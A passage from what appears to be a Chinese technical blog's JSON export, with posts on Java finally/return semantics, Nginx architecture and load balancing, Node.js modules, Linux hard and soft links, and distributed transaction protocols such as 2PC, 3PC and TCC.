打印test11()函数的返回值，即打印test12 return。 结论try语句块或catch语句块中的return语句会先被执行（但不会立即返回），之后再去执行finally语句块。 而当等到finally语句块执行完成后，函数返回才会执行。 [例子4] - 值类型再来看一个程序： 123456789101112131415161718192021222324public class Main &#123; public static void main(String[] args) &#123; int j = query(); System.out.println(j); &#125; public static int query() &#123; int i = 0; try &#123; System.out.print(\"try\\n\"); return i += 40; &#125; catch (Exception e) &#123; System.out.print(\"catch\\n\"); i += 20; &#125; finally &#123; System.out.print(\"finally1 i:\"+i + \"\\n\"); i += 10; System.out.print(\"finally2 i:\"+i + \"\\n\"); System.out.print(\"finally3\\n\"); //return i; &#125; System.out.print(\"finish\"); return 200; &#125;&#125; 执行结果12345tryfinally1 i:40finally2 i:50finally340 分析 输出finally1 i:40，说明在执行final语句块之前，i += 40会被执行。 输出finally1 i:40，同时说明即使try语句块中有return语句块，fianlly还是会被执行。这就是所谓的”finally一定会执行“。 输出finally2 i:50 finally3 40，说明当执行try语句中的return i += 40;时，JVM会先执行i += 40（等价于i = i + 40），因此此时i的值为40，并且将变量i复制一份（暂且称为i_return）。此后，JVM继续去执行finally语句（注意，finally语句中没有return语句）。 finish没有被输出，说明只要在try语句块和其对应的finally语句块中包含return语句，则在整个try结构后的代码永远不会被执行。 结论 finally语句是在return语句执行后，return语句返回之前执行的。 从JVM管理内存的角度来分析，return返回后，就代表着方法执行结束，相应的该方法的栈帧就出栈了。而这个时候也就意味着，return返回必须在最后执行（否则会出现该方法对应的栈帧已经出栈，但是该方法（的finally语句块）任然在执行），所以finally语句是在return返回之前执行的！ 当在try语句块或catch语句块中包含return语句（而finally语句块中不包含return语句），且return语句中包含赋值操作（或修改值操作），且赋值或修改的变量是值类型时： return语句中的赋值先被执行 赋值后的新变量会被复制一份 执行finally语句块。因此，在fianlly语句块中修改 try语句块或catch语句块中return语句中的变量不会影响return的结果 [例子5] - 值类型再来看一个程序： 123456789101112131415161718192021222324public class Main &#123; public static void main(String[] args) &#123; int j = query(); System.out.println(j); &#125; public static int query() &#123; int i = 0; try &#123; System.out.print(\"try\\n\"); return i += 40; &#125; catch (Exception e) &#123; System.out.print(\"catch\\n\"); i += 20; &#125; finally &#123; System.out.print(\"finally1 i:\"+i + \"\\n\"); i += 10; System.out.print(\"finally2 i:\"+i + \"\\n\"); System.out.print(\"finally3\\n\"); return i; &#125; System.out.print(\"finish\"); return 200; &#125;&#125; 执行结果12345tryfinally1 i:40finally2 i:50finally350 分析注意！这个例子上上面一个例子唯一的区别在于，在finally语句块中存在一个return语句。 输出50，说明： 当执行try语句块中的return i += 40;时，JVM会先执行i += 40（等价于i = i + 40），因此执行后i的值为40，并且将变量i复制一份（暂且称为i_return1）。此后，JVM继续去执行finally语句块。 执行finally语句块中的i += 10;（此后，i的值为50）。 执行finally语句块中的return i;，此时，会将变量i复制一份（称为i_return2），并且将变量i_return2的值作为函数的返回值返回。 总结当在try语句块或catch语句块中包含return语句，且finally语句块中也包含return语句），且return语句中包含赋值操作（或修改值操作），且赋值或修改的变量是值类型时： try语句块中的return语句中的赋值先被执行 赋值后的新变量会被复制一份 执行finally语句块， finally语句块中的return语句被执行 将finally语句块中的return语句中的值作为函数的返回值（而try语句块中的return语句相当于被覆盖了） [例子6] - 引用类型如果这个返回值是引用类型，情况又会有所不同。 1234567891011121314151617181920212223242526import java.util.ArrayList;import java.util.List;public class Main &#123; public static void main(String[] args) &#123; List&lt;String&gt; cats = new ArrayList&lt;&gt;(); cats = query(cats); System.out.println(\"----\"); for(String cat : cats) System.out.println(cat); &#125; public static List&lt;String&gt; query(List&lt;String&gt; cats) &#123; int i = 0; try &#123; System.out.print(\"try\\n\"); cats.add(\"xiaoMeng\"); return cats; &#125; catch (Exception e) &#123; System.out.print(\"catch\\n\"); &#125; finally &#123; System.out.print(\"finally\\n\"); cats.add(\"qiaoGeLi\"); &#125; System.out.println(\"finish\"); return null; &#125;&#125; 执行结果12345tryfinally----xiaoMengqiaoGeLi 分析由于cats是List类型，即一个引用类型。对于引用类型的复制只能在当前进程栈帧的局部变量表中复制一份，而其指向到位于堆（Heap）中的内存地址并没有改变（本质上，仍然是同一个对象）。 结论当在try语句块或catch语句块中包含return语句，且finally语句块中也包含return语句），且return语句中包含赋值操作（或修改值操作），且赋值或修改的变量是引用类型时，无论finally语句块中有没有return语句，若在finally语句块中修改这个引用对象，都会影响最终函数返回值的结果。 总结 finally语句总是在retrun语句执行后，return返回之前执行的，也就是说finally必执行（当然是建立在try执行的基础上） 当在try语句或catch语句中有return语句时，finally语句中修改了返回值的值。若修改的返回值为基本数据类型（比如int，double之类），finally语句中没有return语句，则finally语句中对返回值的修改不会影响最终的返回结果 当在try语句或catch语句中有return语句时，finally语句中修改了返回值的值。若改返回值为引用类型（比如对象，list，map之类），无论finally语句中有没有return语句，finally语句中对返回值的修改都会影响最终的返回结果 Reference finally到底是在return之前执行还是return之后执行？ - https://mp.weixin.qq.com/s/--wUdzWCKH_cV7SQR_CC9A Java finally语句到底是在return之前还是之后执行？ - https://www.cnblogs.com/lanxuezaipiao/p/3440471.html Does a finally block always get executed in Java? - https://stackoverflow.com/questions/65035/does-a-finally-block-always-get-executed-in-java 关于 Java 中 finally 语句块的深度辨析 - https://www.ibm.com/developerworks/cn/java/j-lo-finally/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Architecture】Nginx学习","date":"2019-01-18T04:11:32.000Z","path":"2019/01/18/【Architecture】Nginx学习/","text":"初探Nginx架构nginx在启动后，在unix系统中会以daemon的方式在后台运行，后台进程包含一个master进程和多个worker进程。我们也可以手动地关掉后台模式，让nginx在前台运行，并且通过配置让nginx取消master进程，从而可以使nginx以单进程方式运行。很显然，生产环境下我们肯定不会这么做，所以关闭后台模式，一般是用来调试用的，在后面的章节里面，我们会详细地讲解如何调试nginx。所以，我们可以看到，nginx是以多进程的方式来工作的，当然nginx也是支持多线程的方式的，只是我们主流的方式还是多进程的方式，也是nginx的默认方式。nginx采用多进程的方式有诸多好处，所以我就主要讲解nginx的多进程模式吧。 nginx在启动后，会有一个master进程和多个worker进程。master进程主要用来管理worker进程，包含：接收来自外界的信号，向各worker进程发送信号，监控worker进程的运行状态，当worker进程退出后(异常情况下)，会自动重新启动新的worker进程。而基本的网络事件，则是放在worker进程中来处理了。多个worker进程之间是对等的，他们同等竞争来自客户端的请求，各进程互相之间是独立的。一个请求，只可能在一个worker进程中处理，一个worker进程，不可能处理其它进程的请求。worker进程的个数是可以设置的，一般我们会设置与机器cpu核数一致，这里面的原因与nginx的进程模型以及事件处理模型是分不开的。 nginx的进程模型，可以由下图来表示： Nginx 的负载均衡策略负载均衡技术少不了相关的均衡策略，Nginx 中提供了 4 种均衡策略，我们可以根据具体的业务场景选择合适的均衡策略。下面分别介绍这 4 中均衡策略： 1 基于轮询的均衡策略轮询嘛，就是说对进到nginx的request按照遍历的方式进行分发，如果request 1 分发到 Server A，那么request 2将被分发到 Server B,……以此循环类推。 2 基于最少连接数的均衡策略最少连接，也就是说nginx会判断后端集群服务器中哪个Server当前的 Active Connection 数是最少的，那么对于每个新进来的request,nginx将该request分发给对应的Server。 3 基于ip-hash的均衡策略我们都知道，每个请求的客户端都有相应的 IP 地址，该均衡策略中，nginx将会根据相应的hash函数，对每个请求的 IP 作为关键字，得到的hash值将会决定将请求分发给相应Server进行处理。 4 基于加权轮询的均衡策略加权轮询，很显然这个策略跟我们开题引入的场景是一样的，nginx会给Server配置相应的权重，权重越大，接收的request数将会越多。 惊群现象主进程（master 进程）首先通过 socket() 来创建一个 sock 文件描述符用来监听，然后fork生成子进程（workers 进程），子进程将继承父进程的 sockfd（socket 文件描述符），之后子进程 accept() 后将创建已连接描述符（connected descriptor），然后通过已连接描述符来与客户端通信。 那么，由于所有子进程都继承了父进程的 sockfd，那么当连接进来时，所有子进程都将收到通知并“争着”与它建立连接，这就叫“惊群现象”。大量的进程被激活又挂起，只有一个进程可以accept() 到这个连接，这当然会消耗系统资源。 Nginx对惊群现象的处理Nginx 提供了一个 accept_mutex 这个东西，这是一个加在accept上的一把共享锁。即每个 worker 进程在执行 accept 之前都需要先获取锁，获取不到就放弃执行 accept()。有了这把锁之后，同一时刻，就只会有一个进程去 accpet()，这样就不会有惊群问题了。accept_mutex 是一个可控选项，我们可以显示地关掉，默认是打开的。 Nginx的应用场景 高性能HTTP服务器（动静分离） 反向代理（Reverse Proxy）服务器（负载均衡） 正向代理服务器 高性能HTTP服务器Nginx可以作为一个高性能的HTTP服务器，以向用户提供静态资源。 反向代理（Reverse Proxy）服务器（负载均衡） 反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。 通过一个反向代理服务器实现负载均衡是一个很常见的场景。 即，负载均衡配置一般都需要同时配置反向代理，通过反向代理跳转到负载均衡。 反向代理的用途隐藏服务器真实IP：使用反向代理，可以对客户端隐藏服务器的IP地址。 负载均衡：反向代理服务器可以做负载均衡，根据所有真实服务器的负载情况，将客户端请求分发到不同的真实服务器上。 提高访问速度：反向代理服务器可以对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务，提高访问速度。 提供安全保障：反向代理服务器可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等。 正向代理（Forward Proxy）服务器正向代理（Forward Proxy）通常都被简称为代理，就是在用户无法正常访问外部资源，比方说受到GFW的影响无法访问twitter的时候，我们可以通过代理的方式，让用户绕过防火墙，从而连接到目标网络或者服务。 正向代理的工作原理就像一个跳板，比如：我访问不了google.com，但是我能访问一个代理服务器A，A能访问google.com，于是我先连上代理服务器A，告诉他我需要google.com的内容，A就去取回来，然后返回给我。从网站的角度，只在代理服务器来取内容的时候有一次记录，有时候并不知道是用户的请求，也隐藏了用户的资料，这取决于代理告不告诉网站。 结论就是，正向代理是一个位于客户端和原始服务器(origin server)之间的服务器。为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。 正向代理的用途突破访问限制：通过代理服务器，可以突破自身IP访问限制，访问国外网站，教育网等。 提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，会将部分请求的响应保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。 隐藏客户端真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。 Reference 《Nginx开发从入门到精通》 - http://tengine.taobao.org/book/index.html#id3 Nginx 学习系列（二） ————- 负载均衡 - https://juejin.im/post/5b6a45d5f265da0f9402d118 理解Nginx工作原理 - https://www.jianshu.com/p/6215e5d24553 所有和Java中代理有关的知识点都在这了。 - https://mp.weixin.qq.com/s?__biz=MzI3NzE0NjcwMg==&amp;mid=2650121631&amp;idx=1&amp;sn=c6cfbf6aaaf01899a1d36b562e881f11&amp;chksm=f36bb8bec41c31a865ee13a40fbfa2636328651df3c6af13dd7378511d67eda0dfcc48ec732c&amp;scene=21#wechat_redirect","comments":true,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/categories/Nginx/"},{"name":"Architecture","slug":"Nginx/Architecture","permalink":"http://swsmile.info/categories/Nginx/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"},{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/tags/Nginx/"}]},{"title":"【Node.js】Node的模块定义和使用","date":"2019-01-17T08:23:17.000Z","path":"2019/01/17/【Node-js】Node的模块定义和使用/","text":"模块定义和使用在模块中， 上下文提供 require() 方法来引入外部模块。 对应引入的功能， 上下文提供了 exports对象用于导出当前模块的方法或者变量，并且它是唯一导出的出口。在模块中，还存在 一个module对象，它代表模块自身，而exports是module的属性。在Node中，一个文件就是一个 模块，将方法挂载在exports对象上作为属性即可定义导出的方式： 1234567891011// math.js exports.add = function () &#123; var sum = 0, i = 0, args = arguments, l = args.length; while (i &lt; l) &#123; sum += args[i++]; &#125; return sum; &#125;; 在另一个文件中，我们通过require()方法引入模块后，就能调用定义的属性或方法了： 123456789// program.js var math = require('math'); exports.increment = function (val) &#123; return math.add(val, 1); &#125;; 在Node中引入模块，需要经历如下3个步骤。 (1) 路径分析 (2) 文件定位 (3) 编译执行 在Node中，模块分为两类：一类是Node提供的模块，称为核心模块；另一类是用户编写的 模块，称为文件模块。 核心模块部分在Node源代码的编译过程中，编译进了二进制执行文件。在Node进程启动 时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编 译执行这两个步骤可以省略掉， 并且在路径分析中优先判断， 所以它的加载速度是最 快的。 文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程，速 度比核心模块慢。 Reference 《深入浅出Node.js》","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"}]},{"title":"【Linux】硬链接与软链接","date":"2019-01-10T03:33:19.000Z","path":"2019/01/10/【Linux】硬链接与软链接/","text":"背景在介绍链接的概念之前，我们需要先Unix/Linux文件系统和硬盘储存的基础概念。 基础知识inode 是什么？理解 inode，要从文件储存说起。 文件储存在硬盘上，硬盘的最小存储单位叫做“扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。 操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector 组成一个 block。 文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。 每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。 inode 的内容inode 包含文件的元信息，具体来说有以下内容： 文件的字节数 文件拥有者的User ID 文件的Group ID 文件的读、写、执行权限 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。 链接数，即有多少文件名指向这个inode 文件数据block的位置 可以用stat命令，查看某个文件的inode信息：12$ stat deploy.sh16777220 8623911579 -rwxr-xr-x 1 weishi wheel 0 250 \"Feb 10 16:36:51 2019\" \"Jan 31 12:23:49 2019\" \"Jan 31 12:23:49 2019\" \"Jan 31 11:50:03 2019\" 4096 8 0 deploy.sh 总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。 inode 的大小inode 也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是 inode 区（inode table），存放 inode 所包含的信息。 每个 inode 节点的大小，一般是 128 字节或 256 字节。inode 节点的总数，在格式化时就给定，一般是每 1KB 或每 2KB 就设置一个 inode 。假定在一块 1GB 的硬盘中，每个 inode 节点的大小为 128 字节，每 1KB 就设置一个 inode，那么 inode table 的大小就会达到 128MB，占整块硬盘的12.8%。 查看每个硬盘分区的 inode 总数和已经使用的数量，可以使用 df 命令。 12345678$ df -iFilesystem 512-blocks Used Available Capacity iused ifree %iused Mounted on/dev/disk1s1 976490568 923300584 26609536 98% 3519925 9223372036851255882 0% /devfs 671 671 0 100% 1162 0 100% /dev/dev/disk1s4 976490568 25168808 26609536 49% 12 9223372036854775795 0% /private/var/vmmap -hosts 0 0 0 100% 0 0 100% /netmap auto_home 0 0 0 100% 0 0 100% /home/dev/disk1s3 976490568 1009752 26609536 4% 24 9223372036854775783 0% /Volumes/Recovery inode 号码每个 inode 都有一个号码，操作系统用 inode 号码来识别不同的文件。 这里值得重复一遍，Unix/Linux 系统内部不使用文件名，而使用 inode 号码来识别文件。对于系统来说，文件名只是 inode 号码便于识别的别称或者绰号。 表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的 inode 号码；其次，通过 inode 号码，获取 inode 信息；最后，根据 inode 信息，找到文件数据所在的 block，读出数据。 使用 ls -i 命令，可以看到文件名对应的 inode 号码： 12$ ls -i db.json8626038086 db.json 目录文件Unix/Linux 系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。 目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的 inode 号码。 ls -i 命令列出整个目录文件，即文件名和inode号码： 12345$ ls -i Modem\\ Scripts8617985873 Bluetooth LAN Access.ccl 8617986179 MultiTech MTA128NT ML-PPP.ccl8617985890 Farallon LAN:Modem PC Card.ccl 8617986196 MultiTech MTA128NT PPP.ccl8617985907 Farallon Netopia 56K MLPPP.ccl 8617986213 MultiTech MTA128ST ML-PPP w:DBA.ccl8617985924 Farallon Netopia 56K.ccl 8617986230 MultiTech MTA128ST ML-PPP.ccl 什么是链接？链接简单说实际上是一种文件共享的方式，是 POSIX 中的概念，主流文件系统都支持链接文件。 硬链接（Hard Link）一般情况下，文件名和 inode 号码是”一一对应”关系，即每个inode号码对应一个文件名。但是，Unix/Linux 系统允许，多个文件名指向同一个inode号码。 这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为“硬链接”（hard link）。 硬连接的作用是允许一个文件拥有多个有效路径名（或者说多个文件名），这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。 因为，该特定文件有一个以上的有效路径名（文件名）与同一 inode 号码的映射。只删除一个有效路径名（文件名）并不影响 inode 本身和有效路径名（文件名）之间的映射，只有当最后一个有效路径名（文件名）被删除后，inode 才会被释放。也就是说，文件真正删除的条件是与之相关的所有有效路径名（或者说硬连接文件）均被删除。 ln命令可以创建硬链接：1234$ ln file hard$ ls -li8626081538 -rw-r--r-- 2 weishi staff 12 22 Feb 11:01 file8626081538 -rw-r--r-- 2 weishi staff 12 22 Feb 11:01 hard 运行上面这条命令以后，发现源文件与目标文件的inode号码相同（均为 8626081538），说明这两个有效路径名（文件名）都指向同一个 inode。inode 信息中有一项叫做”链接数”，记录指向该 inode 的有效路径名（文件名）总数。 反过来，删除一个文件名，就会使得 inode 节点中的”链接数”减1。当这个值减到0，表明没有文件名指向这个 inode，系统就会回收这个 inode 号码，以及其所对应block区域。 这里顺便说一下目录文件的”链接数”。创建目录时，默认会生成两个目录项：”.”和”..”。前者的inode号码就是当前目录的inode号码，等同于当前目录的”硬链接”；后者的inode号码就是当前目录的父目录的inode号码，等同于父目录的”硬链接”。所以，任何一个目录的”硬链接”总数，总是等于2加上它的子目录总数（含隐藏目录）。 软链接（Soft Link）除了硬链接以外，还有一种特殊情况。 文件 A 和文件 B 的 inode 号码虽然不一样，但是文件 A 的内容是文件 B 的路径。读取文件 A 时，系统会自动将访问者导向文件 B。因此，无论打开哪一个文件，最终读取的都是文件 B。这时，文件 A 就称为文件 B 的“软链接”（soft link）或者”符号链接（symbolic link）。 这意味着，文件 A 依赖于文件 B 而存在，如果删除了文件 B，打开文件 A 就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件 A 指向文件 B 的文件名，而不是文件 B 的inode号码，文件 B 的inode”链接数”不会因此发生变化。 使用方法 1ln -s [源文件] [目标文件] 当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件。 我们只要在某个固定的目录，放上该文件，然后在其它的目录下用ln命令链接（link）它，而不重复占用磁盘空间。例如：ln -s /bin/less /usr/local/bin/less -s 是代号（symbolic）的意思。 当我们访问/usr/local/bin/less时，操作系统会自动将这个路径转换为ln -s /bin/less。 ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化； 软链接和硬链接的区别为了更清晰的看到他们的区别，我们可以做一个实验。 我们首先在自己的一个工作目录下创建一个文件，然后对这个文件进行链接的创建： 123$ touch myfile &amp;&amp; echo \"This is a plain text file.\" &gt; myfile$ cat myfileThis is a plain text file. 现在我们创建了一个普通地不能再普通的文件了。然后我们对它创建一个硬链接，并查看一下当前目录： 1234$ ln myfile hard$ ls -li8622074481 -rw-r--r-- 2 weishi staff 27 10 Jan 11:15 hard8622074481 -rw-r--r-- 2 weishi staff 27 10 Jan 11:15 myfile 在 ls 结果的最左边一列，是文件的 inode 值，你可以简单把它想成 C 语言中的指针。它指向了物理硬盘的一个区块，事实上文件系统会维护一个引用计数，只要有文件指向这个区块，它就不会从硬盘上消失。 你也看到了，这两个文件就如同一个文件一样，inode 值相同，都指向同一个区块。 我们修改一下刚才创建的 hard 链接文件： 1234$ echo \"New line\" &gt;&gt; hard$ cat myfileThis is a plain text file.New line 可以看到，这两个文件果真就是一个文件。下面我们看看软链接（也就是符号链接）和它有什么区别。 1234$ ln -s myfile soft$ ls -li8623913939 lrwxr-xr-x 1 weishi staff 6 31 Jan 11:57 soft -&gt; myfile8622074481 -rw-r--r-- 2 weishi staff 36 10 Jan 11:18 myfile 你会发现，这个软链接的 inode 竟然不一样啊，并且它的文件属性上也有一个 l的 flag，这就说明soft和myfile文件分别指向了物理硬盘的不同区块。 下面我们试着删除 myfile 文件，然后分别输出软硬链接的文件内容： 123456$ rm myfile$ cat hardThis is a plain text file.New line$ cat softcat: soft: No such file or directory 观察： 之前的硬链接没有丝毫地影响，因为它 inode 所指向的区块由于有一个硬链接在指向它，所以这个区块仍然有效，并且可以访问到。 然而软链接的 inode 所指向的内容实际上是保存了一个绝对路径，当用户访问这个文件时，系统会自动将其替换成其所指的文件路径，然而这个文件已经被删除了，所以自然就会显示无法找到该文件了。 为验证这一猜想，我们再向这个软链接写点东西： 1234$ echo \"Something\" &gt;&gt; soft$ lshard myfile soft 可以看到，刚才删除的 myfile 文件竟然又出现了！这就说明，当我们写入访问软链接时，系统自动将其路径替换为其所代表的绝对路径，并直接访问那个路径了。 采坑当对文件夹建立软链接，且使用相对路径时，在macOS下，发现会建立一个无效的软连接。 123456$ ls ./test1800.jmx$ ls test2$ ln -s ./test1 ./test2$ cd ./test2/test1cd: too many levels of symbolic links: ./test2/test1 总结到这里我们其实可以总结一下了： 硬链接：与普通文件没什么不同，inode 都指向同一个文件在硬盘中的区块 软链接：保存了其代表的文件的绝对路径，是另外一种文件，在硬盘上有独立的区块，访问时替换自身路径。 Reference 理解inode - http://www.ruanyifeng.com/blog/2011/12/inode.html 5分钟让你明白“软链接”和“硬链接”的区别 - https://www.jianshu.com/p/dde6a01c4094 linux 创建连接命令 ln -s 软链接 - http://www.cnblogs.com/kex1n/p/5193826.html 理解 Linux 的硬链接与软链接 - https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Distributed System】分布式系统的数据一致性（Data Consistency）","date":"2019-01-09T08:10:50.000Z","path":"2019/01/09/【Distributed-System】分布式系统的数据一致性/","text":"什么是数据一致性（Data Consistency）数据一致性（Data Consistency）其实是数据库系统中的概念。我们可以简单地把一致性理解为正确性或者完整性。 数据库事务（Database Transaction）我们知道，在数据库系统中通常用事务来保证数据的一致性和完整性。 数据库事务，核心是数据库ACID（原子性、一致性、隔离性和持久性）属性。即对于一个数据库事务中所有的逻辑处理操作，只有这些作用在数据库上的逻辑处理操作全部都成功时，对数据库的修改才会永久更新到数据库中。若存在任何一个操作失败，对于在此之前的所有逻辑操作都会失效（即该事务被回滚）。 一致性模型（Consistency Model）强一致性（Strong Consistency）强一致性（Strong Consistency）要求更新过的数据能被后续的访问都能看到，这种是对用户最友好的，就是用户上一次写什么，下一次就保证能读到什么。 但是这种实现对性能影响较大，因为这意味着，只要上次的操作没有处理完，就不能让用户读取数据。 关系型数据库就保证了强一致性。 弱一致性（Weak Consistency）符合弱一致性（Weak Consistency）的系统并不保证进程或者线程的访问都会返回最新的更新过的值。系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体的承诺多久之后可以读到。但会尽可能保证在某个时间级别（比如秒级别）之后，可以让数据达到一致性状态。 最终一致性（Eventual Consistency）最终一致性是弱一致性的特定形式。系统保证在没有后续更新的前提下，系统最终返回上一次更新操作的值。在没有故障发生的前提下，不一致窗口的时间主要受通信延迟，系统负载和复制副本的个数影响。DNS是一个典型的最终一致性系统。 分布式事务（Distributed Transaction）分布式事务是指会涉及到操作多个数据库的事务。其实就是将对同一库事务的概念扩大到了对多个库的事务。目的是为了保证分布式系统中的数据一致性，分布式事务处理的关键是必须有一种方法可以知道事务在任何地方所做的所有动作，提交或回滚事务的决定必须产生统一的结果（全部提交或全部回滚）。 在分布式系统中，各个节点之间在物理上相互独立，通过网络进行沟通和协调。由于存在事务机制，可以保证每个独立节点上的数据操作可以满足ACID。但是，相互独立的节点之间无法准确的知道其他节点中的事务执行情况。 所以从理论上讲，两台机器理论上无法达到一致的状态。如果想让分布式部署的多台机器中的数据保持一致性，那么就要保证在所有节点的数据写操作，要不全部都执行，要么全部的都不执行。但是，一台机器在执行本地事务的时候无法知道其他机器中的本地事务的执行结果。所以他也就不知道本次事务到底应该 commit 还是 rollback 。 所以，常规的解决办法就是引入一个“协调者（Coordinator）”的组件来统一调度所有分布式节点的执行。 分布式事务处理的对象是全局事务。 所谓全局事务，是指分布式事务处理环境中，多个数据库可能需要共同完成一个工作，这个工作即是一个全局事务，例如，一个事务中可能更新几个不同的数据库。对数据库的操作发生在系统的各处但必须全部被提交或回滚。此时一个数据库对自己内部所做操作的提交不仅依赖本身操作是否成功，还要依赖与全局事务相关的其它数据库的操作是否成功，如果任一数据库的任一操作失败，则参与此事务的所有数据库所做的所有操作都必须回滚。 分布式事务的算法为了解决分布式事务的一致性问题，在长期的研究探索过程中，涌现出了一大批经典的一致性协议和算法，其中比较著名的有两阶段提交（Two-phase commit）、三阶段提交（Three-phase commit）和Paxos算法。 两阶段提交（Two-phase Commit）和三阶提交（Three-phase Commit）通过引入一个“协调者”的组件来统一调度所有分布式节点的执行。 两阶段提交作为实现分布式事务的经典方法，其保证了分布式事务的原子性：即所有结点要么全做要么全不做。 而很多系统在实践中，使用以 Paxos 理论 为基础而衍生出来的变种和简化版。例如 Google 的 Chubby、MegaStore、Spanner 等系统，ZooKeeper 的 ZAB 协议，还有更加容易理解的 Raft 协议。 两阶段提交（Two-phase commit，2PC）两阶段提交（Two-phase commit，2PC）是指，在计算机网络以及数据库领域内，为了使基于分布式系统架构下的所有节点在进行事务提交时保持一致性而设计的一种算法（Algorithm）。通常，两阶段提交也被称为是一种协议（Protocol），称为二阶提交协议（Two-phase commitment Protocol）。 在分布式系统中，每个节点虽然可以知晓自己的操作是成功或者失败，却无法知道其他节点的操作的成功或失败。当一个事务跨越多个节点时，为了保持事务的ACID特性，需要引入一个作为协调者的组件来统一掌控所有节点（每一个节点都是一个事务参与者（Participant））的操作结果并最终指示这些节点是否要把操作结果进行真正的提交(比如将更新后的数据写入磁盘等等)。 因此，二阶段提交的算法思路可以概括为：参与者将操作成败通知协调者，再由协调者根据所有参与者的反馈情报决定各参与者是否要进行提交（Commit）操作还是回滚（Rollback）操作。 三阶段提交（Three-phase Commit）由于二阶段提交存在着诸如同步阻塞、单点问题、脑裂等缺陷。所以，研究者们在二阶段提交的基础上做了改进，提出了三阶段提交。 三阶段提交（Three-phase commit，3PL），也叫三阶段提交协议（Three-phase commit protocol），是二阶段提交（2PC）的改进版本。 与两阶段提交不同的是，三阶段提交有两个改动点： 引入超时机制 - 同时在协调者和参与者中都引入超时机制。这保证了参与者的事务锁在指定时间后会被自动释放（release），从而避免了因锁长期被占用导致查询性能下降的情况 在第一阶段和第二阶段中插入一个准备阶段，保证了在最后提交阶段之前各参与节点的状态是一致的。 所谓的三个阶段分别是：询问，然后再锁资源，最后真正提交。 第一阶段：CanCommit 第二阶段：PreCommit 第三阶段：DoCommit Paxos算法基于消息传递且具有高度容错性的一致性算法。Paxos算法要解决的问题就是如何在可能发生几起宕机或网络异常的分布式系统中，快速且正确地在集群内部对某个数据的值达成一致，并且保证不论发生以上任何异常，都不会破坏整个系统的一致性。 //TODO https://juejin.im/post/5b2664bd51882574874d8a76 Raft算法https://juejin.im/post/5b2664e2f265da59584d8c90 柔性事务（Soft Transaction）两阶段提交基于全局事务（DTP模型），前面也提到了，由于2PC自身就存在同步阻塞的问题，这也就导致全局事务效率很低。所以，这种全局事务并不适合解决大型网站的分布式事务问题。 柔性事务是由于互联网应用的需求产生的，而互联网应用最核心需求是高可用（即BASE中的BA）。 所谓柔性事务（Soft Transaction），相比较与数据库事务中的ACID这种刚性事务来说，柔性事务保证的事“基本可用，最终一致”这其实就是基于BASE理论，保证数据的最终一致性。 最广泛被使用的方案就是通过消息分布式事务达到分布式事务的最终一致。 柔性事务的实现1、两阶段型：就是分布式事务两阶段提交，对应技术上的XA、JTA/JTS。这是分布式环境下事务处理的典型模式。 2、补偿型：TCC型事务（Try/Confirm/Cancel）可以归为补偿型。 3、异步确保型将一些同步阻塞的事务操作变为异步的操作，避免对数据库事务的争用，典型例子是热点账户异步记账、批量记账的处理。 4、最大努力型PPT中提到的例子交易的消息通知（例如商户交易结果通知重试、补单重试） 消息分布式事务TCC操作 TCC 即 Try-Confirm-Cancel。 Try: 尝试执行业务 完成所有业务检查(一致性) 预留必须业务资源(准隔离性) Confirm:确认执行业务 真正执行业务 不作任何业务检查 只使用Try阶段预留的业务资源 